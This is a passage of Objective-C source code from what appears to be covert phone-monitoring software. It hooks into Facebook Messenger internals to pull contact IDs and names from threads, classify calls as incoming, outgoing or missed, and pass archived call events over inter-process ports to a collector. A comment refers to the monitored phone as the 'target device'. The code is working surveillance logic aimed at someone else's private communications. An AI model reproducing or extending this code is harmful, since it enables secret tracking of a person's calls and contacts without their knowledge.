			if ([[participantInfo userId] isEqualToString:[self getUserID]])
				[tempParticipants removeObject:object];						
		}
	}
	
	DLog (@"tempParticipants step 1: %@", tempParticipants)
	
	// ---
	NSDictionary *contactInfoDict			= nil;
	if (tempParticipants	&& [tempParticipants lastObject]) {
		id object = [tempParticipants lastObject];
		FBMParticipantInfo *participantInfo		= nil;
		
		// Fixed how to get participants in Faceook 6.7
		Class $FBMThreadUser = objc_getClass("FBMThreadUser");
		if ([object isKindOfClass:$FBMThreadUser]) { // Facebook 6.5 downward, Messenger 2.7 downward
			FBMThreadUser *user = object;
			participantInfo = [user participantInfo];
		} else {
			participantInfo = object;
		}
        
        // Messenger 29.1 name in participant info is nil
        NSString *userId = [participantInfo userId];
        NSString *name = [participantInfo name];
        if (!name) {
            name = [FacebookUtilsV2 userNameWithUserID:userId];
        }
		
		contactInfoDict						= [NSDictionary dictionaryWithObjectsAndKeys:
											   userId, USER_ID_KEY,
											   name, USERNAME_KEY,
											   nil];				
	}
	[tempParticipants release];
	return contactInfoDict;	
}

/*
 This method is used for finding the direction of VoIP event
 return value: IN / OUT
 */
+ (FxEventDirection) getVoIPDirectionWithMessageText: (NSString *) aMessage 
									   threadMessage: (ThreadMessage *) aThreadMessage 
											  meUser: (FBMessengerUser *) aMeUser
											senderID: (NSString *) aSenderID {
	FxEventDirection direction	= kEventDirectionUnknown;	
	
	// Identify Direction
	if ([aSenderID isEqualToString:[self getUserID]]) { // If the sender is target device ==> outgoing
		direction = kEventDirectionOut;
	} else {
		direction = kEventDirectionIn;
		
		// find the word "missed" 
		NSRange findMissedRange = [aMessage rangeOfString:@"missed"];
		if (findMissedRange.location != NSNotFound	&& 
			findMissedRange.length	 != 0			){
			direction = kEventDirectionMissedCall;
        } else {
            // Messenger 35.0, 36.0
            /*
            logMessage                   = {
                answered = 0;
                caller = "fbid:100000767128477";
                endTime = 1442562103925;
                startTime = 1442562103925;
            }*/
            
            NSDictionary *logMessage = [aThreadMessage logMessage];
            NSNumber *answered = [logMessage objectForKey:@"answered"];
            if (![answered boolValue]) {
                direction = kEventDirectionMissedCall;
            }
            DLog(@"logMessage, %@", logMessage);
        }
	}
	return direction;	
}

- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSMutableData* data			= [[NSMutableData alloc] init];
		
		NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:aVoIPEvent forKey:kFacebookArchied];
		[archiver finishEncoding];
		[archiver release];	
		
		// -- first port ----------
		BOOL sendSuccess = [FacebookUtils sendDataToPort:data portName:kFacebookCallLogMessagePort1];
		if (!sendSuccess){
			DLog (@"First attempt fails %@", aVoIPEvent)
			
			// -- second port ----------
			sendSuccess = [FacebookUtils sendDataToPort:data portName:kFacebookCallLogMessagePort2];
			if (!sendSuccess) {
				DLog (@"Second attempt fails %@", aVoIPEvent)
				
				[NSThread sleepForTimeInterval:1];
				
				// -- Third port ----------				
				sendSuccess = [FacebookUtils sendDataToPort:data portName:kFacebookCallLogMessagePort3];						
				if (!sendSuccess) {
					DLog (@"LOST Facebook VoIP event %@", aVoIPEvent)
				}
			}
		}			
		[data release];
	}
	@catch (NSException * e) {
        DLog (@"Voip Thread exception %@", e);
	}
	@finally {
		;
	}
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kFacebookMessagePort]) {
			sharedFileSender = [[FacebookUtils shareFacebookUtils] mIMSharedFileSender];
		} else {
			sharedFileSender = [[FacebookUtils shareFacebookUtils] mVOIPSharedFileSender];
		}
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

- (void) dealloc {
	[mofflineThreadingId release];
	[mAcessToken release];
	[mMessageID release];
	[mIMSharedFileSender release];
	[mVOIPSharedFileSender release];
	[super dealloc];
}

@end
